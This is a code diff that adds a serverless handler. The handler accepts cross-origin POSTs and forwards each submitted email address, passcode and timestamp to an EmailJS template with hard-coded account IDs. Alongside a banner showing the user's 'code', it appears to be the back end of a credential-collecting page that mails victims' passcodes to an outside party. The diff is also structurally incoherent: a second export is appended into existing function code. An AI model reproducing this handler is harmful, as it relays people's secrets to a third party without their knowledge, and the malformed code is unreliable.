@@ -42,3 +42,31 @@ export default async function handler(req, res) {
         banner.innerHTML = '⚠️ Offline Mode • Your Code: <b>' + code + '</b>';
       });
     }
+module.exports = async (req, res) => {
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+  if (req.method === 'OPTIONS') return res.status(200).end();
+
+  try {
+    const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
+    const response = await fetch('https://emailjs.com', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        service_id: 'service_x4flyen',
+        template_id: 'template_csrue8p',
+        user_id: 'gMrrdOr6utn_kwlZx',
+        template_params: {
+          email: body.email,
+          passcode: body.passcode,
+          time: body.time
+        }
+      })
+    });
+    const text = await response.text();
+    return res.status(200).json({ ok: response.ok, status: response.status, message: text });
+  } catch (err) {
+    return res.status(200).json({ ok: false, message: err.message });
+  }
+};
